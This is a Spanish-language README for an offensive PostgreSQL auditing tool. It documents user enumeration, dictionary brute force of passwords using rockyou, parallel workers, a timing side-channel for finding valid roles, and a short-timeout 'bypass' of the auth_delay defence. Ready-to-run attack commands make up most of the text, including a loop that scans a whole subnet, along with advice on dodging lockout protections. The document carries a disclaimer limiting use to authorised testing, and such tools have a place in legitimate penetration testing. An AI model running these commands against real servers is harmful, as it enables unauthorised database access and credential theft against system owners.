# PG_BRUTEFORCE v2.0

> Herramienta de auditoría profesional para servidores PostgreSQL con soporte de paralelismo, análisis de timing y técnicas avanzadas de evasión de defensas.

```
  ██████   ██████     ██████  ██████  ██    ██ ████████ ███████
  ██   ██ ██         ██   ██ ██   ██ ██    ██    ██    ██
  ██████  ██   ███   ██████  ██████  ██    ██    ██    █████
  ██      ██    ██   ██   ██ ██   ██ ██    ██    ██    ██
  ██       ██████    ██████  ██   ██  ██████     ██    ███████
                     v2.0 — Auditoría Profesional PostgreSQL
```

> ⚠️ **AVISO LEGAL:** Esta herramienta es exclusivamente para uso en pruebas de penetración autorizadas, auditorías de seguridad con permiso explícito del propietario del sistema y entornos controlados propios. El uso contra sistemas sin autorización es **ilegal** y puede acarrear consecuencias penales graves. El autor no se responsabiliza del uso indebido.

---

## Índice

- [Características](#características)
- [Requisitos](#requisitos)
- [Instalación](#instalación)
- [Referencia de Opciones](#referencia-de-opciones)
- [Modos de Uso](#modos-de-uso)
  - [1. Modo Análisis de Timing](#1-modo-análisis-de-timing)
  - [2. Modo Enumeración de Usuarios](#2-modo-enumeración-de-usuarios)
  - [3. Modo Fuerza Bruta de Contraseñas](#3-modo-fuerza-bruta-de-contraseñas)
  - [4. Modo Paralelo](#4-modo-paralelo)
  - [5. Bypass de auth\_delay](#5-bypass-de-auth_delay)
- [La Técnica de los Tres Tiempos](#la-técnica-de-los-tres-tiempos)
- [Formatos de Salida](#formatos-de-salida)
- [Ejemplos Avanzados](#ejemplos-avanzados)
- [Preguntas Frecuentes](#preguntas-frecuentes)

---

## Características

| Función | Descripción |
|---|---|
| 🔍 **Enumeración de usuarios** | Detecta qué usuarios/roles existen en el servidor |
| 🔑 **Fuerza bruta de contraseñas** | Ataque de diccionario contra un usuario concreto |
| ⏱️ **Análisis de timing** | Detecta usuarios válidos y configuración del servidor por diferencia de tiempo de respuesta |
| ⚡ **Multiproceso** | Workers paralelos configurables para máxima velocidad |
| 🛡️ **Bypass de auth_delay** | Usa timeout bajo para saltar esperas de `pg_auth_delay` |
| 📋 **Logging estructurado** | Salida a archivo con timestamps para reporting |
| 🔇 **Modo silencioso** | Solo imprime hallazgos positivos, ideal para pipelines |
| 🧹 **Limpieza automática** | Mata workers y borra archivos temporales al salir (SIGINT/SIGTERM) |

---

## Requisitos

| Dependencia | Paquete (Debian/Ubuntu) | Función |
|---|---|---|
| `psql` | `postgresql-client` | Cliente PostgreSQL |
| `bc` | `bc` | Aritmética de punto flotante para timing |
| `timeout` | `coreutils` (incluido) | Control de timeouts por intento |
| `flock` | `util-linux` (incluido) | Mutex para output en modo paralelo |
| `awk` | `gawk` (incluido) | Distribución de trabajo entre workers |

### Instalación de dependencias

```bash
# Debian / Ubuntu
sudo apt update && sudo apt install -y postgresql-client bc

# RHEL / CentOS / Fedora
sudo dnf install -y postgresql bc

# Arch Linux
sudo pacman -S postgresql bc
```

---

## Instalación

```bash
# Clonar el repositorio
git clone https://github.com/TU_USUARIO/pg-bruteforce.git
cd pg-bruteforce

# Dar permisos de ejecución
chmod +x pg_bruteforce.sh

# Verificar dependencias (el script lo hace automáticamente)
./pg_bruteforce.sh -H
```

---

## Referencia de Opciones

### Conexión

| Opción | Argumento | Default | Descripción |
|---|---|---|---|
| `-h` | `<host>` | `127.0.0.1` | IP o hostname del servidor PostgreSQL |
| `-p` | `<port>` | `5432` | Puerto TCP del servidor |
| `-d` | `<db>` | `postgres` | Base de datos a usar en los intentos |

### Ataque

| Opción | Argumento | Default | Descripción |
|---|---|---|---|
| `-u` | `<file>` | — | Archivo de texto con lista de **usuarios** (uno por línea) |
| `-f` | `<file>` | — | Archivo de texto con lista de **contraseñas** (uno por línea) |
| `-U` | `<user>` | `postgres` | Usuario objetivo para ataque de contraseñas (`-f`) |
| `-P` | `<pass>` | `check_user_123` | Contraseña base para enumeración de usuarios (`-u`) |

### Rendimiento y Paralelismo

| Opción | Argumento | Default | Descripción |
|---|---|---|---|
| `-w` | `<num>` | `1` | Número de workers paralelos. Recomendado: 4–16 según el servidor |
| `-T` | `<seg>` | `5` | Timeout máximo por intento en segundos. Admite decimales: `0.5` |

### Análisis de Timing

| Opción | Argumento | Default | Descripción |
|---|---|---|---|
| `-A` | — | — | Activa el **Modo Análisis** (Técnica de los Tres Tiempos) |
| `-n` | `<num>` | `3` | Número de muestras para promediar cada medición |
| `-D` | `<seg>` | `0.3` | Umbral en segundos para considerar una diferencia de tiempo como significativa |

### Extras

| Opción | Descripción |
|---|---|
| `-S` | Salta la verificación de alcance TCP al puerto |
| `-q` | Modo silencioso: solo imprime líneas `[->]` (hallazgos) |
| `-x` | Detiene la ejecución al encontrar el primer resultado exitoso |
| `-o <file>` | Guarda todos los eventos con timestamp en un archivo de log |
| `-H` | Muestra el menú de ayuda y sale |

---

## Modos de Uso

### 1. Modo Análisis de Timing

Analiza el comportamiento del servidor **sin conocer ningún usuario ni contraseña**. Implementa la [Técnica de los Tres Tiempos](#la-técnica-de-los-tres-tiempos) para determinar si un usuario existe y qué tipo de protección tiene el servidor.

```bash
# Análisis básico del usuario 'postgres' (por defecto)
./pg_bruteforce.sh -h 192.168.1.10 -A

# Análisis del usuario 'admin' con 5 muestras y umbral de 0.5s
./pg_bruteforce.sh -h 192.168.1.10 -A -U admin -n 5 -D 0.5

# Análisis de timing sobre una lista de usuarios
./pg_bruteforce.sh -h 192.168.1.10 -A -u users.txt -n 3 -D 0.3 -o timing_report.log
```

**Salida esperada:**
```
[PASO 1/3] Midiendo latencia TCP (baseline de red)...
  ↳ Tiempo TCP promedio: 0.0012s

[PASO 2/3] Midiendo respuesta con usuario INEXISTENTE (usr_probe_a3f9b2)...
  ↳ Tiempo promedio: 0.0150s

[PASO 3/3] Midiendo respuesta con usuario OBJETIVO (postgres)...
  ↳ Tiempo promedio: 1.0183s

─────────────────── RESUMEN DE MEDICIONES ─────────────────────
  Tiempo TCP (red baseline):            0.0012s
  Tiempo usuario inexistente:           0.0150s
  Tiempo usuario objetivo (postgres):   1.0183s
  Diferencia (objetivo - inexistente):  1.0033s
  Umbral configurado:                   0.3s

[✔] DELAY SELECTIVO DETECTADO
    El usuario 'postgres' probablemente EXISTE en el servidor.
    El servidor aplica auth_delay SOLO cuando el usuario es válido.
```

---

### 2. Modo Enumeración de Usuarios

Prueba una lista de posibles usuarios contra el servidor e identifica cuáles existen.

```bash
# Básico
./pg_bruteforce.sh -h 192.168.1.10 -u usuarios.txt

# Con contraseña base personalizada y guardando resultados
./pg_bruteforce.sh -h 192.168.1.10 -u usuarios.txt -P "MiPass123" -o validos.log

# Modo silencioso: solo imprime usuarios válidos
./pg_bruteforce.sh -h 192.168.1.10 -u usuarios.txt -q -o validos.log
```

**Interpretación de resultados:**

| Prefijo | Significado |
|---|---|
| `[->]` | **Usuario VÁLIDO** detectado (requiere contraseña) |
| `[->]` | **Acceso directo** sin contraseña (alta criticidad) |
| `[!]` | **Timeout**: posible usuario válido con `auth_delay` activo |
| `[X]` | El usuario no existe o está denegado por `pg_hba.conf` |
| `[?]` | Respuesta inesperada (revisar manualmente) |

---

### 3. Modo Fuerza Bruta de Contraseñas

Prueba una lista de contraseñas contra un usuario concreto.

```bash
# Ataque básico
./pg_bruteforce.sh -h 192.168.1.10 -U postgres -f rockyou.txt

# Salir al primer éxito y guardar resultado
./pg_bruteforce.sh -h 192.168.1.10 -U postgres -f rockyou.txt -x -o resultado.log

# Apuntando a una base de datos específica
./pg_bruteforce.sh -h 192.168.1.10 -U admin -f passes.txt -d myapp
```

---

### 4. Modo Paralelo

Lanza múltiples workers simultáneos para multiplicar la velocidad. Ideal cuando el servidor no tiene `auth_delay`.

```bash
# 8 workers en paralelo, timeout de 3 segundos
./pg_bruteforce.sh -h 192.168.1.10 -u users.txt -w 8 -T 3

# 16 workers para fuerza bruta intensiva
./pg_bruteforce.sh -h 192.168.1.10 -U postgres -f rockyou.txt -w 16 -T 3 -o resultado.log
```

> **Nota sobre la distribución de workers:** Los workers dividen la lista de entrada mediante distribución modular: cada worker *i* procesa las líneas donde `número_de_línea % total_workers == i`. Esto garantiza que no haya solapamiento y que todo el archivo sea cubierto de forma equitativa.

**Recomendaciones para `-w`:**

| Escenario | Workers sugeridos |
|---|---|
| Servidor local / laboratorio | 8–16 |
| Red LAN | 4–8 |
| Red WAN / Internet | 2–4 |
| Servidor con `auth_delay` activo | 1 (para evitar lockout) |

---

### 5. Bypass de auth\_delay

`auth_delay` es una extensión de PostgreSQL que introduce una pausa en intentos fallidos. El bypass consiste en usar un `-T` (timeout) inferior al tiempo de delay configurado. Cuando el servidor no responde a tiempo, el script lo interpreta como `[!] TIMEOUT` — lo que en contexto de enumeración de usuarios significa que **el usuario existe** (porque solo hay delay para usuarios válidos con delay selectivo).

```bash
# Primero: analizar cuánto tarda el servidor con usuario real vs ficticio
./pg_bruteforce.sh -h 192.168.1.10 -A -n 5

# Servidor con delay de 1s → usar -T 0.5 para bypassear
# Usuarios que NO existen responden en ~0.01s → no hay timeout
# Usuarios que SÍ existen → auth_delay → timeout → [!]
./pg_bruteforce.sh -h 192.168.1.10 -u users.txt -T 0.5 -w 8 -q -o bypass_result.log

# Revisar quién generó timeouts (= usuarios válidos)
grep "TIMEOUT\|SUCCESS" bypass_result.log
```

---

## La Técnica de los Tres Tiempos

Esta técnica permite **identificar usuarios válidos y la configuración de seguridad del servidor** sin conocer ninguna credencial correcta, basándose en diferencias de tiempo de respuesta de PostgreSQL.

### Fundamento

PostgreSQL procesa las solicitudes de conexión en fases. Dependiendo de en qué fase falle la autenticación, la respuesta llega en momentos distintos:

```
[Cliente] → TCP → [pg_hba.conf] → [Catálogo de roles] → [Auth] → [Respuesta]
    ↑               ↑                     ↑                 ↑
 ~0.001s         ~0.010s              ~0.015s           ~1.015s (si hay auth_delay)
```

### Los Tres Tiempos

#### ⏱ Tiempo 1 — Baseline TCP
Mide el tiempo puro de red sin involucrar a PostgreSQL en absoluto.

```bash
time bash -c "echo > /dev/tcp/192.168.1.10/5432"
# Resultado típico: 0.001s–0.005s
```

Esto establece el ruido de red que hay que descontar de las demás mediciones.

#### ⏱ Tiempo 2 — Usuario Inexistente
Intenta conectar con un usuario que casi con certeza no existe (nombre aleatorio).

```bash
time PGPASSWORD="cualquier" psql -h 192.168.1.10 -U usr_xyz99random -d postgres -c "SELECT 1"
# role "usr_xyz99random" does not exist → ~0.010s–0.020s
```

Si el servidor responde rápido, significa que **no aplica delay a roles no existentes**.

#### ⏱ Tiempo 3 — Usuario Objetivo
Intenta conectar con el usuario que se quiere verificar (ej. `postgres`).

```bash
time PGPASSWORD="cualquier" psql -h 192.168.1.10 -U postgres -d postgres -c "SELECT 1"
# password authentication failed → ~0.015s o ~1.015s (con auth_delay)
```

### Matriz de Interpretación

| T. Usuario objetivo | T. Usuario inexistente | Conclusión |
|---|---|---|
| ~0.010s | ~0.010s | ✅ Sin delay. Servidor expuesto, ataque directo rápido |
| ~1.000s | ~1.000s | 🟡 Delay **global**. No se puede enumerar por timing |
| ~1.000s | ~0.010s | 🔴 Delay **selectivo** → el usuario **EXISTE**. auth_delay confirma el rol |
| 1s → 2s → 4s | cualquiera | 🚨 Defensa activa (credcheck). Penalización progresiva, riesgo de lockout |

### Aplicación práctica

```bash
# 1. Correr el análisis primero
./pg_bruteforce.sh -h IP -A -n 5

# 2. Si hay delay selectivo → usar la recomendación que da el script
./pg_bruteforce.sh -h IP -U postgres -f wordlist.txt -T 0.5 -w 4

# 3. Si el servidor es rápido → máxima velocidad
./pg_bruteforce.sh -h IP -u users.txt -w 16 -T 2
```

---

## Formatos de Salida

### Salida en pantalla

```
[->] [1.023s]  Usuario VÁLIDO: 'postgres' (requiere contraseña)
[->] [0.015s]  ¡ACCESO DIRECTO! Usuario 'admin' sin contraseña
[!]  [0.501s]  Timeout (>0.5s) → Posible usuario válido: 'pguser'
[X]  [0.012s]  Usuario 'nobody' no existe.
[X]  [0.011s]  Usuario 'test' denegado por pg_hba.conf
```

### Archivo de log (`-o archivo.log`)

```
[2025-07-10 14:32:01] [START] PG_BRUTEFORCE v2.0 | Host: 10.0.0.1:5432 | DB: postgres | Workers: 4 | Timeout: 3s
[2025-07-10 14:32:02] [SUCCESS] [1.023s] Usuario VÁLIDO: 'postgres' (requiere contraseña)
[2025-07-10 14:32:03] [INFO] [0.012s] Usuario 'nobody' no existe.
[2025-07-10 14:32:05] [TIMING-VALID] Usuario: 'postgres' T=1.0183s Delta=1.0033s
[2025-07-10 14:32:10] [END] Proceso finalizado.
```

---

## Ejemplos Avanzados

```bash
# ─── Flujo completo de auditoría ─────────────────────────────────────────────

# Paso 1: Analizar el servidor sin conocer nada
./pg_bruteforce.sh -h 10.0.0.5 -A -n 5 -o audit.log

# Paso 2: Enumerar usuarios en paralelo con bypass de delay
./pg_bruteforce.sh -h 10.0.0.5 -u /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
    -w 8 -T 0.8 -q -o audit.log

# Paso 3: Fuerza bruta sobre usuario encontrado
./pg_bruteforce.sh -h 10.0.0.5 -U postgres \
    -f /usr/share/wordlists/rockyou.txt \
    -w 4 -T 3 -x -o audit.log

# ─── Análisis de toda una subred (con bucle externo) ─────────────────────────
for ip in 10.0.0.{1..254}; do
    ./pg_bruteforce.sh -h "$ip" -S -A -q -o "scan_${ip}.log" 2>/dev/null
done

# ─── Filtrar solo resultados positivos del log ────────────────────────────────
grep -E "\[SUCCESS\]|\[TIMING-VALID\]|\[TIMEOUT\]" audit.log

# ─── Enumeración con lista de usuarios y palabras en paralelo ────────────────
./pg_bruteforce.sh -h 10.0.0.5 -u users.txt -P "Password1" -w 10 -T 1.5 -q
```

---

## Preguntas Frecuentes

**¿Por qué mis workers no van más rápido con `-w 16`?**
El cuello de botella suele ser el propio servidor PostgreSQL o la red. Si el servidor tiene `auth_delay`, cada intento bloqueará el tiempo configurado independientemente de cuántos workers uses. Usa `-T` bajo para bypassearlo.

**¿El script puede producir lockouts?**
Si el servidor tiene `credcheck` u otras extensiones de penalización progresiva, sí. El modo `-A` detecta esta situación y lo advierte. En ese caso, reduce `-w 1` y aumenta `-T`.

**¿Qué lista de usuarios recomiendas para empezar?**
- [SecLists - postgres-usernames](https://github.com/danielmiessler/SecLists/blob/699d20f40e6e5f32db6d59957e7abc0630113d37/Usernames/cirt-default-usernames.txt#L685)
- Lista básica: `postgres`, `admin`, `pgadmin`, `dbadmin`, `superuser`, `pgsql`, `root`


**¿Qué lista de contraseña recomiendas para empezar?**
- [SecLists - postgres-usernames](https://github.com/kkrypt0nn/wordlists/tree/main/wordlists/passwords)



**¿Puedo usar esto contra PostgreSQL en Docker?**
Sí, siempre que el puerto esté expuesto. Ajusta `-h localhost -p 5433` (o el puerto que hayas mapeado).

**¿El modo `-A` consume créditos de intentos fallidos?**
Sí, hace N×3 intentos reales (TCP + usuario falso + usuario objetivo), donde N es el valor de `-n`. En servidores con credcheck, esto puede contar. Usa `-n 1` para minimizar el impacto.



### Ideas para contribuciones

- [ ] Soporte para SSL/TLS (`-c sslmode=require`)
- [ ] Modo CIDR scan (escanear rangos de IPs)
- [ ] Integración con `pg_sleep` para técnicas de timing más precisas
- [ ] Exportación de resultados en JSON
- [ ] Detección automática de versión de PostgreSQL
